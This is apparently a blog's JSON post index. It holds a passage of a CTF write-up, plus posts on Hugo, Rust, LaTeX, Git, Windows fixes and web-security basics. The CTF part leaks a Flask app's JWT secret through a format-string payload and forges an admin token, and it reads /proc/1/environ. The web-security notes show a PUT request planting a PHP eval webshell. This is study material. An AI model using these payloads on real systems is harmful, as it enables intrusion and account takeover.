(在初始化的用户空间中的UID和GID都是0)．但是在4.11之后的内核版本，如果这个进程不是在初始化的用户空间中，它的UID却是0，那么对应的/proc/pid的权限也是root:root.这就意味着在docker容器内，如果将进程的PID设置为0，那么这个进程在容器内就是以root权限运行的   所以可以尝试查看/proc/0以及/proc/1，在/proc/1/environ中发现flag。  后来看wp发现这个是非预期解。  [MoeCTF 2021]地狱通讯与地狱通讯-改  from flask import Flask, render_template, request, make_response, redirect from secret import secret, headers, User  # 导入必要的模块和对象 import datetime import jwt  # JSON Web Token库，用于生成和验证token  app = Flask(__name__)  @app.route(\"/\", methods=['GET', 'POST']) def index():     # 打开并读取当前脚本(app.py)的内容     f = open(\"app.py\", \"r\")     ctx = f.read()     f.close()      # 创建响应对象     res = make_response(ctx)          # 获取URL参数中的'name'，如果没有提供则为空字符串     name = request.args.get('name') or ''          # 如果'name'包含'admin'或者为空，则直接返回脚本内容     if 'admin' in name or name == '':         return res          # 创建JWT token的有效载荷     payload = {         \"name\": name,     }          # 使用'secret'密钥和指定的headers生成JWT token     token = jwt.encode(payload, secret, algorithm='HS256', headers=headers)          # 将生成的token设置为cookie     res.set_cookie('token', token)          return res  @app.route('/hello', methods=['GET', 'POST']) def hello():     # 尝试从cookie中获取'token'     token = request.cookies.get('token')          # 如果没有找到token，则重定向到首页     if not token:         return redirect('/', 302)          try:         # 解码token，如果签名无效则抛出异常         name = jwt.decode(token, secret, algorithms=['HS256'])['name']     except jwt.exceptions.InvalidSignatureError as e:         return \"Invalid token\"          # 如果解码后的名字不是'admin'，则根据名字创建User对象，并准备消息     if name != \"admin\":         user = User(name)         flag = request.args.get('flag') or ''         message = \"Hello {0}, your flag is\" + flag         return message.format(user)     else:         # 如果是'admin'，渲染包含flag的页面         return render_template('flag.html', name=name)  if __name__ == \"__main__\":     app.run()   所以先在根域名下通过name生成一串cookie，再进入hello，用flag注入  payload  {0.__class__.__init__.__globals__}   找到密钥  u_have_kn0w_what_f0rmat_i5   python中伪造一个cookie  需要注意的是，pip应该安装PyJWT而不是jwt，在这被坑了  pip install PyJWT  import jwt  jwt.encode({\"name\":\"admin\"}, \"u_have_kn0w_what_f0rmat_i5\", algorithm='HS256', headers={\"alg\": \"HS256\",\"typ\": \"JWT\"})   得到eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4ifQ.jlAcmWWxtmNLxbxwfRE45Fxf16dX6LQmrK_1dgx7zmg  从而获得flag  这个题和LitCTF2023 WEEK3ssti十分类似"
  },
  
  {
    "title": "GitHubPages + Hugo博客搭建记录",
    "url": "/posts/hugo/",
    "categories": "Blogs",
    "tags": "hugo, web",
    "date": "2024-10-28 21:13:03 +0800",
    "content": "今日打开尘封多年的github pages，搭建自己的博客，为了防止重构时忘了怎么搞，故做个笔记。  〇、远程连接仓库  首先创建一个username.github.io的仓库，作为github pages的目录  一、安装Hugo  进入hugo官方仓库，下载最新release：Releases · gohugoio/hugo  我用的windows11，所以下载amd64版本。如果在虚拟机上运行，应当下载linux-amd64版本。  hugo的配置很简单，下载下来的压缩包里只有hugo.exe，只需要将其放到任意安装目录即可。  我将hugo安装到E:\\ProgramFile\\hugo中，并将此目录配置到环境变量path中，当启动powershell，输入hugo有反应时，表明hugo配置成功。  二、初始化网页  切换到工作目录，创建自己的网站：  cd D:\\Workspace hugo new site MyGitHubPages   接着，进入工作目录：  hugo -D   这样便会生成一个发布版的网页，目录为.\\MyGitHubPages\\public，为了方便使用，我们把这里设为git仓库。  在这之前，清空public中的所有文件，然后  git pull remote http://github.com/&lt;MY sites&gt; git add . git commit -m \"first commit\" git push origin main   三、配置主题  我选择了hyde主题，导入主题需要如此操作：  cd D:\\Workspace\\MyGitHubPages\\themes git clone https://github.com/spf13/hyde.git   然后配置hugo.toml  code .   修改文件内容为：  baseURL = 'https://lamaper.github.io/' languageCode = 'zh-CN' title = 'lamaper' theme = 'hyde'  [Menus]   main = [       {Name = \"Github\", URL = \"https://github.com/lamaper/\"},       {Name = \"博客园\", URL = \"https://lamaper.cnblogs.com/\"}   ]  [params]   description = \"你好，我是lamaper，BIT信科大一学生，喜欢与计算机相关的所有东西！\"   参考文献Hyde主题使用教程 · Hyou    date = ‘2024-10-29T19:25:03+08:00’ draft = false title = ‘GitHubPages + Hugo博客搭建记录（2）’ tags = [‘blogs’, ‘hugo’] categories = [‘blogs’]    四、杂项  hugo.toml与config.toml  在查找资料的过程中，我发现绝大多数博客和文章中，都会提到config.toml，但是在我的实际操作中，并没有遇到这个文件，整个项目目录中，只有hugo.toml。实际上，经过个人观察，这两个文件的功能应该是一样的。  更换主题报错  之后在更换主题的过程中，我遇到了一个报错：   Error: Error building site: TOCSS: failed to transform \"scss/style.scss\" (text/x-scss). Check your Hugo installation; you need the extended version to build SCSS/SASS. 6:06:59 PM: Total in 5416 ms 6:06:59 PM:   导致这个问题的原因是，该主题用到scss，即安装的hugo版本有误，应当下载的是extended版本.所以正确的下载地址应该是hugo_extended_0.136.5_windows-amd64.zip，在下载完毕之后，替换原来的hugo.exe，这样问题就得到了解决。  这个问题的参考文献：Hugo构建错误  添加分类归档  本来是要添加【分类归档】和【标签】两个功能，但是今天想了半天只实现了一个。  首先是在\\content目录下新建目录categories，并且创建_index.md文件，在里面书写：  +++ title =  \"分类归档\" type = \"taxonomy\" layout = \"categories\" +++   然后回到根目录修改hugo.toml，添加以下内容：  [taxonomies]   tag = \"tags\"   category = \"categories\"  [markup]    [markup.tableOfContents]    startLevel = 1    endLevel = 3   最后需要修改前端显示，由于我对css等前端知识并不熟悉，这段内容交给了AI来实现。  首先切换到当前使用的主题的目录下，找到layouts/_default/list.html，修改为以下内容：     &lt;article&gt;     &lt;aside&gt;       &lt;h2&gt;分类归档&lt;/h2&gt;       &lt;ul class=\"taxonomy-list\"&gt;                    &lt;li&gt;             &lt;a href=\"\"&gt;&lt;/a&gt;             &lt;ul&gt;                                &lt;li&gt;&lt;a href=\"\"&gt;&lt;/a&gt;&lt;/li&gt;                            &lt;/ul&gt;           &lt;/li&gt;                &lt;/ul&gt;     &lt;/aside&gt;      &lt;h1&gt;文章列表&lt;/h1&gt;     &lt;div class=\"post-content\"&gt;&lt;/div&gt;      &lt;ul class=\"posts-list\"&gt;                &lt;li class=\"posts-list-item\"&gt;           &lt;a class=\"posts-list-item-title\" href=\"\"&gt;&lt;/a&gt;           &lt;span class=\"posts-list-item-description\"&gt;                                       &lt;span class=\"posts-list-item-separator\"&gt;-&lt;/span&gt;                           min read           &lt;/span&gt;         &lt;/li&gt;            &lt;/ul&gt;        &lt;/article&gt;     最后添加一些CSS样式，虽然我没看出来这些东西有啥用，但是以防万一，先加上吧。这个文件位置是static/css/styles.css:  .taxonomy-list {   list-style-type: none;   padding: 0; }  .taxonomy-list li {   margin: 5px 0; }  .taxonomy-list li a {   text-decoration: none;   color: #333; }  .taxonomy-list li a:hover {   text-decoration: underline; }    参考文献:hugo官方文档    date = ‘2024-10-30T12:04:12+08:00’ draft = false title = ‘GitHubPages + Hugo博客搭建记录（3）’ tags = [‘blogs’, ‘hugo’] categories = [‘blogs’]    今天魔改了一下主题，主要是添加了归档卡片等东西，学习了一些CSS和前端模版渲染。  list.html     &lt;article&gt;     &lt;aside&gt;       &lt;h2&gt;分类归档&lt;/h2&gt;       &lt;div class=\"categories-archive\"&gt;                    &lt;div class=\"category-card\"&gt;             &lt;a class=\"category-title\" href=\"\"&gt;&lt;/a&gt;             &lt;ul class=\"category-posts\"&gt;                                &lt;li&gt;&lt;a href=\"\"&gt;&lt;/a&gt;&lt;/li&gt;                            &lt;/ul&gt;           &lt;/div&gt;                &lt;/div&gt;     &lt;/aside&gt;     &lt;h1&gt;文章列表 ：&lt;/h1&gt;     &lt;div class=\"post-content\"&gt;&lt;/div&gt;     &lt;ul class=\"posts-list\"&gt;                &lt;li class=\"posts-list-item\"&gt;           &lt;a class=\"posts-list-item-title\" href=\"\"&gt;&lt;/a&gt;           &lt;span class=\"posts-list-item-description\"&gt;                                       &lt;span class=\"posts-list-item-separator\"&gt;-&lt;/span&gt;                          需要  分钟阅读           &lt;/span&gt;           &lt;div class=\"post-preview\"&gt;                        &lt;/div&gt;         &lt;/li&gt;            &lt;/ul&gt;        &lt;/article&gt;     single.html    &lt;article class=\"post\"&gt;     &lt;header class=\"post-header\"&gt;       &lt;h1 class=\"post-title\"&gt;&lt;/h1&gt;       &lt;div class=\"post-meta\"&gt;         &lt;div&gt;                               &lt;/div&gt;         &lt;div&gt;                      需要  分钟阅读         &lt;/div&gt;         &lt;div&gt;                          &lt;a class=\"tag\" href=\"\"&gt;&lt;/a&gt;         &lt;/div&gt;       &lt;/div&gt;     &lt;/header&gt;     &lt;div class=\"post-content\"&gt;            &lt;/div&gt;     &lt;div class=\"post-footer\"&gt;            &lt;/div&gt;   &lt;/article&gt;    baseof.html &lt;!doctype html&gt; &lt;html lang=\"\"&gt;   &lt;head&gt;     &lt;title&gt; // &lt;/title&gt;     &lt;link rel=\"shortcut icon\" href=\"\" /&gt;     &lt;meta charset=\"utf-8\" /&gt;          &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" /&gt;     &lt;meta name=\"author\" content=\"\" /&gt;     &lt;meta name=\"description\" content=\"\" /&gt;     &lt;link rel=\"stylesheet\" href=\"\" /&gt;                            &lt;/head&gt;   &lt;body&gt;     &lt;header class=\"app-header\"&gt;       &lt;a href=\"\"&gt;&lt;img class=\"app-header-avatar\" src=\"\" alt=\"\" /&gt;&lt;/a&gt;       &lt;span class=\"app-header-title\"&gt;&lt;/span&gt;       &lt;nav class=\"app-header-menu\"&gt;                                   &lt;a class=\"app-header-menu-item\" href=\"\"&gt;&lt;/a&gt;       &lt;/nav&gt;       &lt;p&gt;&lt;/p&gt;        &lt;!-- 新增栏目开始        &lt;div class=\"categories-section\"&gt;         &lt;h3&gt;Categories&lt;/h3&gt;         &lt;ul class=\"categories-list\"&gt;                        &lt;li&gt;&lt;a href=\"\"&gt;&lt;/a&gt;&lt;/li&gt;                    &lt;/ul&gt;       &lt;/div&gt;       --&gt;        &lt;div class=\"custom-divider\"&gt;       contact me ↓       &lt;div class=\"app-header-social\"&gt;                    &lt;a href=\"\" target=\"_blank\" rel=\"noreferrer noopener me\"&gt;                        &lt;/a&gt;                &lt;/div&gt;     &lt;/header&gt;     &lt;main class=\"app-container\"&gt;                              &lt;p style=\"text-align: center;\"&gt;Copyright 2014 - 2024 lamaper. All Rights Reserved&lt;/p&gt;     &lt;/main&gt;   &lt;/body&gt; &lt;/html&gt;   assets\\css\\main.scss $darkest-color: ; $dark-color: ; $light-color: ; $lightest-color: ; $primary-color: ;  @import 'base';  @import 'components/app'; @import 'components/error_404'; @import 'components/icon'; @import 'components/pagination'; @import 'components/post'; @import 'components/posts_list'; @import 'components/tag'; @import 'components/tags_list';  // The last 'extra' import can optionally be overridden on a per project // basis by creating a &lt;HUGO_PROJECT&gt;/assets/css/_extra.scss file. @import 'extra';  $primary-color: #333;   body {     font-family: Arial, sans-serif;  //   color: $primary-color;   }      .custom-divider {     width: 100%;     height: 2px;     background: linear-gradient(to right, #666, #333);     margin: 20px 0;   }      .categories-archive {     display: flex;     flex-wrap: wrap;     gap: 20px;     margin-bottom: 20px;   }      .category-card {     background-color: #f9f9f9;     border-radius: 10px;     box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);     padding: 20px;     width: 250px;   }      .category-title {     font-size: 18px;     font-weight: bold;     text-decoration: none;     color: #333;     display: block;     margin-bottom: 10px;   }   .category-title:hover {      color: #666; /* 修改为灰色 */      }      .category-posts {     list-style-type: none;     padding: 0;   }      .category-posts li {     margin: 5px 0;   }      .category-posts li a {     text-decoration: none;     color: #666;   }      .category-posts li a:hover {     text-decoration: underline;   }      .post-preview {       margin-top: 10px;       color: #fff;       font-size: 14px;       line-height: 1.5;     }  本地server显示不了文章的问题  导致这个问题主要是因为我对hugo的认识不够清楚，在写博客的时候不知道从哪抄了一个头标记就用上了，实际上是因为在本地使用hugo -D会生成带有draft（草稿）的博客，而hugo server不会包含带有draft标记的博客。  恰好，我抄的那个头标记中写了draft = true，如此就产生了我的困惑。  感谢littflower提供了解决思路。"
  },
  
  {
    "title": "Rust学习笔记",
    "url": "/posts/rust-study/",
    "categories": "Coding",
    "tags": "coding, rust",
    "date": "2024-10-24 20:41:42 +0800",
    "content": "String和&amp;str  在rustlings的练习题中见到了一些判断类型的题：  fn main() {     string_slice(\"blue\");      string(\"red\".to_string());      string(String::from(\"hi\"));      string(\"rust is fun!\".to_owned());      string_slice(\"nice weather\".into());      string(format!(\"Interpolation {}\", \"Station\"));      // WARNING: This is byte indexing, not character indexing.     // Character indexing can be done using `s.chars().nth(INDEX)`.     string_slice(&amp;String::from(\"abc\")[0..1]);      string_slice(\"  hello there \".trim());      string(\"Happy Monday!\".replace(\"Mon\", \"Tues\"));      string(\"mY sHiFt KeY iS sTiCkY\".to_lowercase()); }   一个&amp;str类型的字符串可以通过.to_string()进行转换。  如果需要删除一个字符串中的空格键，可以使用.trim()。  如果需要在一个字符串（String）后面加上一个新的字符串，可以有如下操作：  fn compose_me(input: &amp;str) -&gt; String {     // TODO: Add \" world!\" to the string! There are multiple ways to do this.     return input.to_string() +  \" world!\"; }   其实对于这段代码我是有点疑惑的，因为在前面的认知中，单独的双引号应当是字符串切片，而不是字符串，但是这里显然，一个String与一个字符串切片的连接，是一个String，而不是一个&amp;str，有点意思。  当然，这个实现方法有很多，比如使用格式化字符串：  format!(\"{} world!\",input);   枚举（enum）  rust的枚举十分强大，可以自带附加属性，这个不好拿语言描述，看下例子即可：  enum Message {     // TODO: Implement the message variant types based on their usage below.     Resize {width: u64, height: u64},     Move(Point),     Echo(String),     ChangeColor(u8, u8, u8),     Quit, }   对于一个枚举，还有一个很好用的match语句来进行匹配：  fn process(&amp;mut self, message: Message) {         // TODO: Create a match expression to process the different message         // variants using the methods defined above.         match message {             Message::Resize {width, height} =&gt; self.resize(width, height),             Message::Move(point) =&gt; self.move_position(point),             Message::Echo(s) =&gt; self.echo(s),             Message::ChangeColor(red, green, blue) =&gt; self.change_color(red, green, blue),             Message::Quit =&gt; self.quit(),         }     }   和switch-case有异曲同工之妙，但比其更加强大。"
  },
  
  {
    "title": "\\[转&改\\] LaTeX环境配置",
    "url": "/posts/LaTeX/",
    "categories": "Blogs",
    "tags": "latex",
    "date": "2024-10-19 22:42:00 +0800",
    "content": "[转&amp;改] LaTeX环境配置  原地址：真香警告, 2024年中的vscode+latex写作 - 知乎 (zhihu.com)  参考：LaTeX快速指南（二）：编辑器的安装与配置 - 知乎 (zhihu.com)  为防止无法再次找到本教程，对2024年10月9日的网页进行快照保存。  为方便自己观看，我对以下内容作了修改。–lamaper 2024/10/9    安装texlive  windows 端的安装                 [Index of /CTAN/systems/texlive/Images/       清华大学开源软件镜像站       Tsinghua Open Source Mirror](https://link.zhihu.com/?target=https%3A//mirrors.tuna.tsinghua.edu.cn/CTAN/systems/texlive/Images/)           直接下载 texlive.iso，运行里面的 install-tl-windows.bat    取消勾选这个没用的texwork（如果你觉得好用，请别打我）  等待一阵漫长的安装（什么时候才能用包管理器一键安装啊……）  linux端的安装（windows用户跳过）  linux 端 通过命令或者文件管理器挂载文件  sudo mount -o loop texlive.iso /mnt   如果需要使用图形界面安装的话，需要安装下面两个软件包  sudo pacman -S perl perl-tk   perl 一般发行版都自带了，perl-tk 可能需要自行安装，然后使用命令  sudo ./install -gui   就会打开与windows相同的图形安装界面，直接点安装即可，也可以自行更改安装路径（建议 /usr/local 或者 /opt/）  有些发行版可以通过包管理器一键安装，不过需要网络，以 Archlinux 为例：  添加竹林源  Clansty’s Archlinux Repository (pacman.ltd)  然后  sudo pacman -S texlive-full   最近这个源好像出了一些问题，有些包没有了，如果无法下载可以本地安装。  最后需要添加windows字体，不然tex编译的字体可能不正确，也很简单，直接找一台windows电脑，把 C:/windows/fonts 复制到 /usr/share/fonts/ 下面，然后  sudo fc-cache -fsv   就可以了，解决字体办法有很多，我认为这是最简单的一种了，双系统用户 0 难度。  这里默认 linux 用户都是懂电脑的，所以就不配图了。  验证安装  打开终端，输入 xelatex，如果有以下输出，说明安装成功：    macOS端的安装  最简单无脑的就是macOS，安装包与前面Linux和Windows用的不同，下载地址：  MacTeX - TeX Users Group  这个包是universe的，inter和m芯片的都可以用。直接像装普通软件一样安装即可，安装后会多出几个这玩意    除了BibDesk之外，用得都不多，BibDesk也可以用别的文献管理软件替代。  进一步验证安装，在终端输入：  latex -v   有形如下图的输出即可  pdfTeX 3.141592653-2.6-1.40.25 (TeX Live 2023) kpathsea version 6.3.5 Copyright 2023 Han The Thanh (pdfTeX) et al. There is NO warranty.  Redistribution of this software is covered by the terms of both the pdfTeX copyright and the Lesser GNU General Public License. For more information about these matters, see the file named COPYING and the pdfTeX source. Primary author of pdfTeX: Han The Thanh (pdfTeX) et al. Compiled with libpng 1.6.39; using libpng 1.6.39 Compiled with zlib 1.2.13; using zlib 1.2.13 Compiled with xpdf version 4.04   安装visual studio code（windows）  这个不用说了，应用商店一键安装，也可以下载安装包安装    设置中文之类的就不说了（我的vscode用作代码编辑，insider版本当文档编辑，配置都是一样的）  安装visual studio code（linux）  下载deb安装，通过包管理器安装都可以，ubuntu用ppa，arch用yay，略过。  我现在切换到了 NixOS，就顺便提一句，只能使用 vscode-fhs 才行（懂得都懂我在说什么，不懂的你也没必要懂）。  安装visual studio code （macOS）  下载universe的版本安装即可，略过。  配置latex  安装插件    就这一个玩意就可以满足基本需求  使用浏览器作为PDF阅读器  这种方式可以很便携的实现反向定位和自动刷新。以下几种浏览器我都测过可以完美实现：     Chrome，Edge，Arc   Firefox   Safari   配置latex-workshop  注意，这里的配置需要在settings.json中进行编辑，因此你需要打开这个文件。  在VS Code的顶部菜单栏寻找带有放大镜图标的搜索栏，键入  &gt;Open User Settings (JSON)   会打开settings.json，若该文件内已有内容，则在上方内容末端加入,，然后在下面粘贴以下代码（不包括最外层大括号）  否则，直接粘贴下方内容  {     // latex 配置     \"latex-workshop.view.pdf.viewer\": \"browser\",     \"latex-workshop.view.pdf.ref.viewer\": \"auto\",     \"latex-workshop.view.pdf.external.viewer.args\": [         \"%PDF%\"     ],     \"latex-workshop.latex.tools\": [         {             \"name\": \"xelatex-latexmk\",             \"command\": \"latexmk\",             \"args\": [                 \"-f\",                 \"-synctex=1\",                 \"-interaction=nonstopmode\",                 \"-file-line-error\",                 \"-xelatex\",                 \"-outdir=%OUTDIR%\",                 \"%DOC%\"             ]         },         {             \"name\": \"pdflatex-latexmk\",             \"command\": \"latexmk\",             \"args\": [                 \"-f\",                 \"-synctex=1\",                 \"-interaction=nonstopmode\",                 \"-file-line-error\",                 \"-pdf\",                 \"-outdir=%OUTDIR%\",                 \"%DOC%\"             ]         },         {             \"name\": \"xelatex-latexmk-with-shell-escape\",             \"command\": \"latexmk\",             \"args\": [                 \"-f\",                 \"--shell-escape\",                 \"-synctex=1\",                 \"-interaction=nonstopmode\",                 \"-file-line-error\",                 \"-xelatex\",                 \"-outdir=%OUTDIR%\",                 \"%DOC%\"             ]         },         {             \"name\": \"pdflatex-latexmk-with-shell-escape\",             \"command\": \"latexmk\",             \"args\": [                 \"-f\",                 \"--shell-escape\",                 \"-synctex=1\",                 \"-interaction=nonstopmode\",                 \"-file-line-error\",                 \"-pdf\",                 \"-outdir=%OUTDIR%\",                 \"%DOC%\"             ]         },         {             \"name\": \"latexmk\",             \"command\": \"latexmk\",             \"args\": [                 \"-f\",                 \"-synctex=1\",                 \"-interaction=nonstopmode\",                 \"-file-line-error\",                 \"-pdf\",                 \"%DOC%\"             ]         },         {             \"name\": \"bibtex\",             \"command\": \"bibtex\",             \"args\": [                 \"%DOCFILE%\"             ]         },     ],     // 用于配置编译链     \"latex-workshop.latex.recipes\": [         {             \"name\": \"latexmk\",             \"tools\": [                 \"latexmk\"             ]         },         {             \"name\": \"xelatex-latexmk\",             \"tools\": [                 \"xelatex-latexmk\"             ]         },         {             \"name\": \"pdflatex-latexmk\",             \"tools\": [                 \"pdflatex-latexmk\"             ]         },         {             \"name\": \"xelatex-latexmk-with-shell-escape\",             \"tools\": [                 \"xelatex-latexmk-with-shell-escape\"             ]         },         {             \"name\": \"pdflatex-latexmk-with-shell-escape\",             \"tools\": [                 \"pdflatex-latexmk-with-shell-escape\"             ]         },         {             \"name\": \"BibTeX\",             \"tools\": [                 \"bibtex\"             ]         },     ],     // 文件清理     \"latex-workshop.latex.clean.fileTypes\": [         \"*.log\"     ],     \"latex-workshop.latex.recipe.default\": \"lastUsed\",     \"latex-workshop.view.pdf.internal.synctex.keybinding\": \"double-click\",     \"latex-workshop.showContextMenu\": true,     \"latex-workshop.intellisense.package.enabled\": true,     \"[latex]\": {         \"editor.formatOnPaste\": true,         \"editor.suggestSelection\": \"recentlyUsedByPrefix\"     },     \"latex-workshop.latex.autoBuild.run\": \"onSave\", }     之前在每一个配置项上都写了注释，这里全部删了，因为但你把他们粘贴到vscode配置文件中时，鼠标移动到对应选项上都会出现相关说明，没有必要长篇大论。  自编译脚本（可选）  针对一些比较特殊的需求，可增加一个自定义编译脚本选项。  \"latex-workshop.latex.external.build.command\": \"./compile.sh\"   意思是，但你编译（无论自动还是手动）时，不使用latexshop的编译链，而是执行compile.sh脚本，这种方式能够控制得更加底层，我提供一个模板 compile.sh，编译链为tex -&gt; bibtex -&gt; tex^2，可按需修改:  #!/bin/bash # 脚本用于编译latex  # 主文件名 filename=\"&lt;NAME&gt;\"  # 编译器 # command=\"pdflatex\" command=\"xelatex\"  # 编译参数 args=\"-synctex=1 -interaction=nonstopmode -file-line-error -pdf\"  # 编译链 # xetex -&gt; bibtex -&gt; xetex^2 for i in {1 .. 3} do \t$command $args $filename.tex \tif [ $i -eq 1 ]; then \t\tbibtex $filename \tfi done   该脚本可以完成大多数论文的编译工作。  注意事项  latexmk 对于错误容忍度比较低，连 bib 不正确都会显示为编译失败（但是文档可以正确输出），这可以在一定程度上帮助你排错，但是如果你错误太多可能会比较烦，这时候可以考虑用自编译脚本。  尝试使用  在新的WorkSpace中新建任意一个.tex文件，输入：  \\documentclass{ctexart} \\begin{document}     Hello, \\LaTeX!          你好，\\LaTeX！ \\end{document}   然后按照如下操作，检测是否有浏览器页面弹出Latex的PDF预览。    教程  【4万字长文吐血整理】LaTeX基础使用【助你熟练玩转LaTeX】_latex教程-CSDN博客  LaTex的使用（2）_latex标题-CSDN博客  在 LaTeX 中行内书写符号（极限、积分、求和、连乘） (360doc.com)  常见问题  Latex页边距过大 - 知乎 (zhihu.com)  Latex 字体的设置_latex字体-CSDN博客"
  },
  
  {
    "title": "Git学习笔记",
    "url": "/posts/git-study/",
    "categories": "Coding",
    "tags": "git",
    "date": "2024-10-14 15:39:42 +0800",
    "content": "本地Git向GitHub提交代码  建立SSH连接  初次向github推送自己的代码，需要创建ssh-key  首先在任意目录下打开git bash，键入：  ssh-keygen -t rsa -C \"yourEmail@example.com\"   会在~/.ssh目录下生成两个文件，我们复制公钥：  clip &lt; ~/.ssh/id_rsa.pub   接着进入SSH and GPG keys (github.com)  选择new SSH key，将公钥粘贴进去即可。  设置本地git  首先，在没有其他特殊需求的情况下，设置全局用户名和邮箱：  git config --global user.name \"yourName\" git config --global user.email \"yourEmail@example.com\"   接着，在你已经配置好github的情况下，测试连接是否正常：  ssh -T git@github.com   进行代码操作  首先将仓库的代码克隆到本地：  git clone https://github.com/yourName/example.git   紧接着，进入到这个目录中去，初始化仓库：  git init   查看仓库状态：  git status   需要注意的是，克隆下来的代码自带git配置，所以不需要在进行分支设置，直接对其进行同步操作即可：  git pull   紧接着可以对仓库内的东西进行修改。  在修改结束后，将仓库内需要更新的文件添加如仓库，一般我们同步全部的资料：  git add .   在这之后我们可以进行代码的提交：  git commit -m \"this is a example\"   之后将代码同步到云端：  git push   即可完成操作  git pull/push 遭遇网络问题  一般来说，github的连接很不稳定，常用VPN进行加速，但因此会使得SSH连接异常，解决方法是将自己git的端口改为同VPN系统代理一样的端口：  git config --global http.proxy http://127.0.0.1:&lt;端口&gt; git config --global https.proxy https://127.0.0.1:&lt;相同的端口&gt;   特别地，如果需要sock5代理，也是如下操作：  git config --global http.proxy socks5://127.0.0.1:&lt;端口&gt; git config --global https.proxy socks5://127.0.0.1:&lt;相同的端口&gt;"
  },
  
  {
    "title": "电脑疑难杂症解决办法（1）",
    "url": "/posts/win-prob-1/",
    "categories": "Blogs",
    "tags": "Windows11",
    "date": "2024-09-27 20:12:00 +0800",
    "content": "lamaper  Q：Windows11下运行Photoshop2022大概率闪退  疑似是兼容性的问题，解决办法是在%Appdata%\\Adobe\\Adobe Photoshop 2020\\Adobe Photoshop 2020 Settings下创建或修改PSUserConfig.txt为  EnableDocumentGroup 0 UXPLearnAndSearch 0   然后右键快捷方式图标，选择兼容性Windows8，再以管理员模式启动，即可解决问题。[2024-8-22]  参考文献：ps2022一用魔棒就闪退_360问答 (so.com)  解决Ps点击魔法棒功能闪退，AdobePhotoshop2022魔法棒功能无法使用，Photoshop魔法棒无法使用_ps2022使用魔棒闪退资源-CSDN文库  Ｑ：如何删除“设备与驱动器”中的百度网盘／迅雷网盘的图标  注册表：  \"计算机\\HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\NameSpace\\\"   删除相应字段  Q：如何将windows11的默认输入语言改为英文  在Win+I进入设置窗口后，进入时间和语言\\语言和区域，点击添加语言，选择English（美国），安装。  然后进入时间和语言\\输入\\高级键盘设置，替换默认输入法即可。  Q：如何将windows11切换输入法的快捷键改为Shift+Ctrl  进入时间和语言\\输入\\高级键盘设置，点击蓝字输入语言热键，选择在输入语言之间，选择快捷键即可。  Q：windows11下通过格式工厂转换图片闪退  同理photoshop闪退，使用管理员模式运行即可。"
  },
  
  {
    "title": "Web安全与渗透测试笔记",
    "url": "/posts/web-study/",
    "categories": "Cyber Security",
    "tags": "ctf, web, php",
    "date": "2024-08-29 22:17:02 +0800",
    "content": "@author: lamaper  推荐网站  黑客技术 - 渗透测试 - 吾爱漏洞 (52bug.cn)  CVERC-国家计算机病毒应急处理中心  国家信息安全漏洞库 (cnnvd.org.cn)  阿里云漏洞库 (aliyun.com)  安全客 - 安全资讯平台 (anquanke.com)  HackTricks - HackTricks  首页 - 『代码审计』知识星球 (govuln.com)  首页 - 离别歌 (leavesongs.com)  本笔记目前更适用于CTF，渗透测试的内容正在更新  推荐靶场  NSSCTF - 主页 (ctfer.vip)  BUUCTF在线评测 (buuoj.cn)  https://app.hackthebox.com/  本文遵循CC BY-SA 4.0:要求署名原作者与来源、允许转载或二创、允许商用、要求同协议共享  一、基本网络知识  （一）网络是怎样联通的     TCP/IP协议   Internet   Http协议   （二）Http协议  http请求  一个完整的Http请求由四个部分组成：     请求行   请求头   空行   请求体   1、请求行  请求行：请求行是由请求方法字段、url字段、http协议版本字段3个部分组成。请求行定义了本次请求的方式，格式如下：GET/example.html HTTP/1.1(CRLF)  请求方法有如下几种：     GET： 请求获取Request-URI所标识的资源   POST： 在Request-URI所标识的资源后增加新的数据   HEAD： 请求获取由Request-URI所标识的资源的响应消息报头   PUT： 请求服务器存储或修改一个资源，并用Request-URI作为其标识   DELETE： 请求服务器删除Request-URI所标识的资源   TRACE： 请求服务器回送收到的请求信息，主要用于测试或诊断   CONNECT： 保留将来使用   OPTIONS： 请求查询服务器的性能，或者查询与资源相关的选项和需求   其中在Web安全中常用的方法为GET和POST，他们通常与编程语言结合，用来传递某些参数，例如在php中：  $a = $_GET['a']; $b = $_POST['b'];   就代表通过get请求对变量a进行传值，通过post请求给变量b传值。  GET请求一般写在url中，例如：  http://www.example.com/?a=123   由?引出需要传递的变量，接着对其赋值，若需要多个变量同时赋值，则需要使用&amp;，例如：  http://www.example.com/?a=123&amp;b=456   除此之外，post传递参数写在请求体中，并且省略问号，直接写a=123；  另外PUT方法在某些时候可以用于上传恶意代码，这是因为PUT可以直接将请求体中的以文件形式上传，如：  PUT example.com/trojan.php HTTP/1.1 Host:................ ...........  &lt;?php  eval($_POST['cmd']); ?&gt;   这样trojan.php就会被创建并且会含有请求体里面的内容，如果Trojan已经存在就会被修改。  当然并不是所有服务器都会允许这些请求方法，通常只有GET、POST被允许，如果我们不知道那些方法被允许，可以使用OPTIONS查看相应头中的Allow的值，这里面包含了服务器允许的请求方式。  另外，由于http请求头是以文本形式发送，有些服务器可以接受特殊的自定义方法，如MoeCTF曾要求选手使用不存在的IS方法对服务器进行请求。  2、请求头  请求头：也被称作消息报头,请求头是由一些键值对组成，每行一对，关键字和值用英文冒号:分隔。允许客户端向服务器发送一些附加信息或者客户端自身的信息，典型的请求头如下:     MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。                  Header       解释       示例                       Accept       指定客户端能够接收的内容类型       Accept: text/plain, text/html                 Accept-Charset       浏览器可以接受的字符编码集。       Accept-Charset: iso-8859-5                 Accept-Encoding       指定浏览器可以支持的web服务器返回内容压缩编码类型。       Accept-Encoding: compress, gzip                 Accept-Language       浏览器可接受的语言       Accept-Language: en,zh                 Accept-Ranges       可以请求网页实体的一个或者多个子范围字段       Accept-Ranges: bytes                 Authorization       HTTP授权的授权证书       Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==                 Cache-Control       指定请求和响应遵循的缓存机制       Cache-Control: no-cache                 Connection       表示是否需要持久连接。（HTTP 1.1默认进行持久连接）       Connection: close                 Cookie       HTTP请求发送时，会把保存在该请求域名下的所有cookie值一起发送给web服务器。       Cookie: 